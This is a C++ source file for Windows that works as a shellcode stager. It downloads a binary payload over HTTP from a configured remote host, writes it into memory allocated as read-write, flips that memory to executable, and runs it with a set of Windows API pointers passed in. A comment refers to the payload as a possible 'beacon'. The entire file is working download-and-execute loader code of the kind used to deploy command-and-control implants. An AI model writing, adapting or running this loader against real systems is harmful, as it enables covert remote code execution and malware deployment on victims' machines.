#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <iostream>
#include <vector>
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "winhttp.lib")

typedef struct Params
{
    LPVOID pBaseAddress;

    HANDLE(WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    BOOL(WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    BOOL(WINAPI *pCloseHandle)(HANDLE);
    DWORD(WINAPI *pGetCurrentProcessId)(void);
    DWORD(WINAPI *pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    VOID(WINAPI *pGetLocalTime)(LPSYSTEMTIME);
    int(WINAPIV *pWsprintfA)(LPSTR, LPCSTR, ...);
    VOID(WINAPI *pOutputDebugStringA)(LPCSTR);

} PARAMS;

typedef VOID (*fprun)(PARAMS *pParams);

int main()
{
    //--------- CONFIGURE -----------
    LPCWSTR remotehost = L"192.168.67.5";
    INTERNET_PORT remoteport = 80;
    LPCWSTR remotedir = L"/file_artifact.bin";
    //-------------------------------

    HINTERNET hInternet = NULL, hHttpSession = NULL, hHttpRequest = NULL;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    std::vector<unsigned char> payloadBuffer;

    // 1. Initialize WinHTTP
    hInternet = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hInternet)
    {
        printf("[!] WinHttpOpen failed\n");
        return 1;
    }

    // 2. Connect to the HTTP server
    hHttpSession = WinHttpConnect(hInternet, remotehost, remoteport, 0);
    if (!hHttpSession)
    {
        printf("[!] WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hInternet);
        return 1;
    }

    // 3. Open and Send Request
    hHttpRequest = WinHttpOpenRequest(hHttpSession, L"GET", remotedir, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hHttpRequest)
    {
        printf("[!] WinHttpOpenRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hHttpSession);
        WinHttpCloseHandle(hInternet);
        return 1;
    }

    // Send request and receive response
    if (!WinHttpSendRequest(
            hHttpRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0))
    {
        printf("[!] WinHttpSendRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hHttpRequest);
        WinHttpCloseHandle(hHttpSession);
        WinHttpCloseHandle(hInternet);
        return 1;
    }

    if (!WinHttpReceiveResponse(hHttpRequest, NULL))
    {
        printf("[!] WinHttpReceiveResponse failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hHttpRequest);
        WinHttpCloseHandle(hHttpSession);
        WinHttpCloseHandle(hInternet);
        return 1;
    }

    // 4. Download loop
    do
    {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hHttpRequest, &dwSize))
            break;
        if (dwSize == 0)
            break;

        // Use a temporary buffer for the chunk
        std::vector<char> tempBuffer(dwSize);
        if (WinHttpReadData(hHttpRequest, (LPVOID)tempBuffer.data(), dwSize, &dwDownloaded))
        {
            payloadBuffer.insert(payloadBuffer.end(), tempBuffer.begin(), tempBuffer.begin() + dwDownloaded);
        }
    } while (dwSize > 0);

    printf("[+] Downloaded %zu bytes from network\n", payloadBuffer.size());

    // 5. Clean up Network Handles IMMEDIATELY after download
    if (hHttpRequest)
        WinHttpCloseHandle(hHttpRequest);
    if (hHttpSession)
        WinHttpCloseHandle(hHttpSession);
    if (hInternet)
        WinHttpCloseHandle(hInternet);
    printf("[+] Network handles closed\n");

    if (payloadBuffer.empty())
    {
        printf("[!] Payload buffer is empty. Exiting.\n");
        return 1;
    }

    // 6. Memory Allocation (RW)
    LPVOID pBuffer = VirtualAlloc(NULL, payloadBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NULL == pBuffer)
    {
        printf("[!] VirtualAlloc failed\n");
        return 1;
    }
    printf("[+] Allocated RW memory at %p\n", pBuffer);

    // 7. Transfer from vector directly to allocated memory
    memcpy(pBuffer, payloadBuffer.data(), payloadBuffer.size());
    printf("[+] Payload written to memory\n");

    // 8. Change protection to RX (Execute)
    DWORD oldProtect;
    if (!VirtualProtect(pBuffer, payloadBuffer.size(), PAGE_EXECUTE_READ, &oldProtect))
    {
        printf("[!] VirtualProtect failed\n");
        return 1;
    }
    printf("[+] Memory protection changed to RX\n");

    PARAMS pParams = {0};

    pParams.pBaseAddress = GetModuleHandleA(NULL);
    pParams.pCreateFileA = CreateFileA;
    pParams.pWriteFile = WriteFile;
    pParams.pCloseHandle = CloseHandle;
    pParams.pGetCurrentProcessId = GetCurrentProcessId;
    pParams.pGetModuleFileNameA = GetModuleFileNameA;
    pParams.pGetLocalTime = GetLocalTime;
    pParams.pWsprintfA = wsprintfA;
    pParams.pOutputDebugStringA = OutputDebugStringA;

    printf("[+] Executing payload...\n");
    fprun Run = (fprun)pBuffer;
    Run(&pParams);

    // Note: If Run() is a beacon, we stay here. If it returns, we free.
    VirtualFree(pBuffer, 0, MEM_RELEASE);

    return 0;
}